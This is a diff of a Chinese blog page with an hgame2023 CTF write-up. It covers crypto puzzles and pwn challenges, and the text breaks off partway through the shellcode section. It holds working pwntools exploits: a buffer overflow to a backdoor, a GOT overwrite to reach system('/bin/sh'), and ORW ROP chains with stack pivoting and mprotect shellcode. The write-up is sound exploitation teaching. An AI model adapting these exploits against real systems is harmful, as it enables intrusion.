+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="re_base2">re_base2</span>
+            <span class="post-date" title="2022-12-21 21:56:29">2022/12/21</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2022/12/20/syc-level7/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="syc_level7">syc_level7</span>
+            <span class="post-date" title="2022-12-20 11:30:36">2022/12/20</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2022/12/19/syc-level5/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="syc_level5">syc_level5</span>
+            <span class="post-date" title="2022-12-19 21:02:09">2022/12/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 re "
+           href="/2022/12/17/re-base1/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="re_base1">re_base1</span>
+            <span class="post-date" title="2022-12-17 21:16:25">2022/12/17</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2022/12/05/%E4%BF%A1%E5%88%9B%E7%BD%91%E5%AE%89wp/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="信创网安wp">信创网安wp</span>
+            <span class="post-date" title="2022-12-05 10:42:19">2022/12/05</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2022/11/29/buuctf-nov/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NOV X联合出题人">NOV X联合出题人</span>
+            <span class="post-date" title="2022-11-29 16:52:11">2022/11/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 ctf "
+           href="/2022/11/21/%E5%AE%89%E5%BE%BD%E7%9C%81%E8%B5%9B/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="安徽省赛">安徽省赛</span>
+            <span class="post-date" title="2022-11-21 14:13:57">2022/11/21</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-hgame2023" class="article article-type-post" itemscope itemprop="blogPost">
     
+        <h1 class="article-title">hgame2023</h1>
     
-    <div class="post-body" itemprop="articleBody">
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="ctf">ctf</a>
+            
+        </span>
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2023-02-14 10:36:57'>2023-01-14 10:09</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#week1"><span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%94%E5%85%94%E7%9A%84%E8%BD%A6%E7%A5%A8"><span class="toc-text">兔兔的车票</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%9E%E7%A7%98%E7%9A%84%E7%94%B5%E8%AF%9D"><span class="toc-text">神秘的电话</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-overflow"><span class="toc-text">easy_overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#choose-the-seat"><span class="toc-text">choose_the_seat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ORW"><span class="toc-text">ORW</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-shellcode"><span class="toc-text">simple_shellcode</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week2"><span class="toc-text">Week2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#re"><span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#before-main"><span class="toc-text">before_main</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week3"><span class="toc-text">Week3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#re-1"><span class="toc-text">re</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
         <p>复现hgame</p>
 <span id="more"></span>
 
@@ -313,7 +736,7 @@
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randint, getrandbits</span><br><span class="line"></span><br><span class="line">flagImg = Image.<span class="built_in">open</span>(<span class="string">f&#x27;pics/enc<span class="subst">&#123;<span class="number">0</span>&#125;</span>.png&#x27;</span>)</span><br><span class="line">width = flagImg.width</span><br><span class="line">height = flagImg.height</span><br><span class="line">flagImg.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    <span class="comment"># 生成图片</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height)) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        imi = Image.<span class="built_in">open</span>(<span class="string">f&quot;pics/enc<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">        imj = Image.<span class="built_in">open</span>(<span class="string">f&quot;pics/enc<span class="subst">&#123;j&#125;</span>.png&quot;</span>)</span><br><span class="line">        xorimg = xorImg(imj, imi)</span><br><span class="line">        xorimg.save(<span class="string">f&#x27;source/xor<span class="subst">&#123;i*<span class="number">16</span>+j&#125;</span>.png&#x27;</span>)</span><br><span class="line">        imi.close()</span><br><span class="line">        imj.close()</span><br></pre></td></tr></table></figure>
 
 <p>最后获得模糊的flag图片：</p>
-<p><img data-src="/./../images/xor246.png" alt="xor246"></p>
+<p><img src="/./../images/xor246.png" alt="xor246"></p>
 <h3 id="神秘的电话"><a href="#神秘的电话" class="headerlink" title="神秘的电话"></a>神秘的电话</h3><p>题目：</p>
 <p>一个疑似base64编码的txt文件</p>
 <p>一个播放起来是一个摩斯密码的wav文件</p>
@@ -322,26 +745,26 @@
 <li><p>提取出声音文件的信息：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">morse2ascii morse.wav</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="/./../images/image-20230114103532078.png" alt="image-20230114103532078"></p>
+<p><img src="/./../images/image-20230114103532078.png" alt="image-20230114103532078"></p>
 </li>
 <li><p>base64解码：</p>
 </li>
 </ol>
-<p><img data-src="/./../images/image-20230114103642721.png" alt="image-20230114103642721"></p>
+<p><img src="/./../images/image-20230114103642721.png" alt="image-20230114103642721"></p>
 <p>篱笆一一&gt;栅栏密码；倒着一一&gt;逆序；密匙一一&gt;维吉尼亚密码;北欧神话一一&gt;vidar</p>
 <p>（这里用morse2ascii计算出的数据多了一些下划线，做法是每一处下划线都去掉一个就行）</p>
 <p>最后flag:</p>
-<p><img data-src="/./../images/image-20230114104040525.png" alt="image-20230114104040525"></p>
+<p><img src="/./../images/image-20230114104040525.png" alt="image-20230114104040525"></p>
 <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>他妈的，这道死活搞不出来，看了wp才知道是close函数关闭了标准输出通道。需要在来个报错输出，把结果输出过来</p>
 <p>题目没啥好讲的，直接上exp</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31267)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line">back_addr = elf.sym[<span class="string">&#x27;b4ckd0or&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">16</span> + p64(<span class="number">0</span>) + p64(back_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>运用1&gt;&amp;2将结果从报错信息中输出</p>
-<p><img data-src="/./../images/image-20230114110109416.png" alt="image-20230114110109416"></p>
+<p><img src="/./../images/image-20230114110109416.png" alt="image-20230114110109416"></p>
 <h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><p>**HINTS:**数组下标的检查好像少了点东西</p>
 <p>下标v0没有检查下界</p>
-<p><img data-src="/./../images/image-20230114151906912.png" alt="image-20230114151906912"></p>
-<p>seats在bss段，并只有seats写入。无法进行栈操作<img data-src="/./../images/image-20230114152100537.png" alt="image-20230114152100537"></p>
+<p><img src="/./../images/image-20230114151906912.png" alt="image-20230114151906912"></p>
+<p>seats在bss段，并只有seats写入。无法进行栈操作<img src="/./../images/image-20230114152100537.png" alt="image-20230114152100537"></p>
 <p>思路：运用负下标进行got表覆盖，用got表泄漏libc的地址</p>
 <ol>
 <li>先用vuln函数覆盖exit的地址，防止程序退出，方便下次再次利用</li>
@@ -353,17 +776,17 @@
 
 <p>这里在覆盖setbuf的地址时会写一个字母，字母所占位置不超过0x1000，因为一个内存页就是0x1000，所以无论基地址如何变，函数在内存页中的偏移地址不变，所以我们写一个字母也只是占用了偏移位置，对计算基地址并不会影响，所以我们查看指定libc中的setbuf（静态），将得到的setbuf的地址的偏移数值和我们泄漏出的偏移数值改成相同，再减去我们泄漏出的总值就能得到base_addr</p>
 <p>下面把d0换成41就行，41就是我们写进去的’A’</p>
-<p><img data-src="/./../images/image-20230114153844803.png" alt="image-20230114153844803"></p>
+<p><img src="/./../images/image-20230114153844803.png" alt="image-20230114153844803"></p>
 <p>如何这里减去总值：</p>
-<p><img data-src="/./../images/image-20230114153925669.png" alt="image-20230114153925669"></p>
+<p><img src="/./../images/image-20230114153925669.png" alt="image-20230114153925669"></p>
 <p>这里还有一种做法就是写入\xd0,就是让地址不发生变化，这样计算基地址直接减去sym中找的地址就行，其实这种做法也就方便了一点点</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name is &#x27;</span>)</span><br><span class="line">setbuf_addr = u64(io.recvuntil(<span class="string">&#x27;Your seat&#x27;</span>).split(<span class="string">b&#x27;\nYour&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(setbuf_addr))</span><br></pre></td></tr></table></figure>
 
 <p>binsh的地址正好是下标0x10的整数倍，然后后面就是puts的地址，可以说出题人别有用心了</p>
-<p><img data-src="/./../images/image-20230114153109502.png" alt="image-20230114153109502"></p>
+<p><img src="/./../images/image-20230114153109502.png" alt="image-20230114153109502"></p>
 <p>这里有两种做法，一种是从-9这个下标写入binsh的字符串和system的地址，让程序调用puts间接调用sytem函数</p>
 <p>第二种做法就是用one_gadget查找libc中，执行binsh的指令</p>
-<p><img data-src="/./../images/image-20230116195715458.png" alt="image-20230116195715458"></p>
+<p><img src="/./../images/image-20230116195715458.png" alt="image-20230116195715458"></p>
 <p>这里其实条件比较苛刻，要求一些寄存器中的地址对应的内容为null，这里存在偶然性，不过也是可以的</p>
 <p>所以我们采用第一种方法</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">9</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,payload)</span><br></pre></td></tr></table></figure>
@@ -374,14 +797,14 @@
 
 <p>将这个函数放置到我们想调试的地方</p>
 <p>效果：</p>
-<p><img data-src="/./../images/image-20230116200235063.png" alt="image-20230116200235063"></p>
+<p><img src="/./../images/image-20230116200235063.png" alt="image-20230116200235063"></p>
 <p>然后再gdb先后输入got一一&gt;p&#x2F;x *(地址),就可以查看某个got中的内容了</p>
-<p><img data-src="/./../images/image-20230116200809156.png" alt="image-20230116200809156"></p>
-<p><img data-src="/./../images/image-20230116200845999.png" alt="image-20230116200845999"></p>
+<p><img src="/./../images/image-20230116200809156.png" alt="image-20230116200809156"></p>
+<p><img src="/./../images/image-20230116200845999.png" alt="image-20230116200845999"></p>
 <p>这里吐槽一下，其实gdb新版本可以直接看到got表的内容，我这个gdb已经是ubuntu20.02的最高版本了，我这个docker就不折腾了</p>
 <p>（PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。解法：内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程）</p>
 <p>结果：</p>
-<p><img data-src="/./../images/image-20230116201152048.png" alt="image-20230116201152048"></p>
+<p><img src="/./../images/image-20230116201152048.png" alt="image-20230116201152048"></p>
 <h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p><strong>CTF中这类PWN题目通常通过禁用execve系统调用添加沙箱，不能直接执行命令getshell，这时候需要通过调用open、read、write这样的函数打开flag，存到内存中，再输出</strong></p>
 <p>将三个函数开头字母作为简称，也就是orw</p>
 <p>可以通过<a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>来判断是否添加沙箱，以及查看沙箱的规则</p>
@@ -402,14 +825,14 @@
 <p>题目中溢出长度为0x30,那注入地址为0x30&#x2F;0x8&#x3D;6,就6条显然不能构成rop链</p>
 <p>进行栈迁移，由于我没做过栈迁移的题，这里详细写一下</p>
 <p>第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址,rbp放到bss+0x200，这个地址其实是程序地址之外的空间了，所以拿来当作新栈对程序不产生影响</p>
-<p><img data-src="/./../images/image-20230115211905558.png" alt="image-20230115211905558"></p>
+<p><img src="/./../images/image-20230115211905558.png" alt="image-20230115211905558"></p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x100</span> + p64(bss+<span class="number">0x200</span>)</span><br><span class="line">payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br></pre></td></tr></table></figure>
 
 <p>计算基地址，算出orw三个函数的地址</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">success(<span class="string">&#x27;puts:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base_addr = puts_addr - libc_puts</span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>] + base_addr</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>] + base_addr</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>] + base_addr</span><br></pre></td></tr></table></figure>
 
 <p>第二次溢出，将rbp放置到新栈</p>
-<p><img data-src="/./../images/image-20230115212222119.png" alt="image-20230115212222119"></p>
+<p><img src="/./../images/image-20230115212222119.png" alt="image-20230115212222119"></p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(vuln_addr + <span class="number">0x0F</span>)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
 
 <p>执行完第二次溢出后，rsp在旧栈位置，rbp在新栈位置，为了让rbp在新栈位置不发生移动，这里我们直接将之后的函数直接定位到read函数上，+0xf，因为read函数之前有对rbp和rsp进行操作</p>
@@ -424,7 +847,7 @@
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31266</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal =  [<span class="string">&quot;konsole&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">libc_puts = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">leave_ret_addr = <span class="number">0x4012be</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0401393</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x100</span> + p64(bss+<span class="number">0x200</span>)</span><br><span class="line">payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;task.\n&#x27;</span>,payload1)</span><br><span class="line">puts_addr = u64(io.recvline().split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base_addr = puts_addr - libc_puts</span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>] + base_addr</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>] + base_addr</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>] + base_addr</span><br><span class="line">pop_rsi_ret = <span class="number">0x02601f</span> + base_addr</span><br><span class="line">pop_rdx_ret = <span class="number">0x142c92</span> + base_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(vuln_addr + <span class="number">0x0F</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次溢出，将rbp放到二次写入的开始处，将rsp放到与rbp相同位置</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>) <span class="comment">#这里就是新rbp-0x100的地方，也就是刚写&#x27;/flag\x00\x00\x00&#x27;的地址</span></span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x3</span>) </span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404711</span>)   <span class="comment"># 指定缓冲区地址,随意</span></span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x100</span>)</span><br><span class="line">payload2 += p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x1</span>)</span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404711</span>)</span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x100</span>)</span><br><span class="line">payload2 += p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>)   <span class="comment"># 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去</span></span><br><span class="line">payload2 += p64(leave_ret_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>最后结果：</p>
-<p><img data-src="/./../images/image-20230115214426688.png" alt="image-20230115214426688"></p>
+<p><img src="/./../images/image-20230115214426688.png" alt="image-20230115214426688"></p>
 <p>这里还有一种做法，原本程序开启了NX保护，我们可以通过libc中的mprotect函数给一段内存区域更改权限，然后在栈中写入shellcode，然后让程序执行栈中的shellcode，这里shellcode也很长，也需要用到栈迁移</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload2 = p64(<span class="number">0</span>)   <span class="comment">#0x404160</span></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404000</span>) <span class="comment">#这里是mprotect函数要操作的开始地址   #0x404170</span></span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x1000</span>)          <span class="comment"># 要操作的大小 #0x404180</span></span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">7</span>)  <span class="comment"># 7代表可读可写可执行权限   #0x404190</span></span><br><span class="line">payload2 += p64(mprotect_addr)</span><br><span class="line">payload2 += p64(<span class="number">0x4041a8</span>)       <span class="comment">#0x4041a0</span></span><br><span class="line">payload2 += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>,<span class="number">1</span>))   </span><br><span class="line">payload2 += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0x404500</span>,<span class="number">100</span>))</span><br><span class="line">payload2 += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0x404500</span>,<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>)   <span class="comment"># 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去</span></span><br><span class="line">payload2 += p64(leave_ret_addr)</span><br></pre></td></tr></table></figure>
 
@@ -441,23 +864,23 @@
 <p>题目用mmap映射出一段以0xCAFE0000开始，长度为0x1000，权限是7（可读可写可执行）</p>
 <p>用sandbox设置了系统权限</p>
 <p>这里向0xCAFE0000读入16字节，可以考虑rop，但检查保护时，就放弃了</p>
-<p><img data-src="/./../images/image-20230116111016050.png" alt="image-20230116111016050"></p>
+<p><img src="/./../images/image-20230116111016050.png" alt="image-20230116111016050"></p>
 <p>写入shellcode,用orw的话，长度也远远不够</p>
 <p>HINTS:</p>
 <p>一次read不够多，为什么不再读一次呢？</p>
 <p>第一次将read的shellcode读入，然后再程序执行0xCAFE0000这段内存，从而执行读入的read，那就要好好设计一波read的shellcode了，起初我是用rdi这种64位的寄存器写的，但是最终长度远远超过16字节</p>
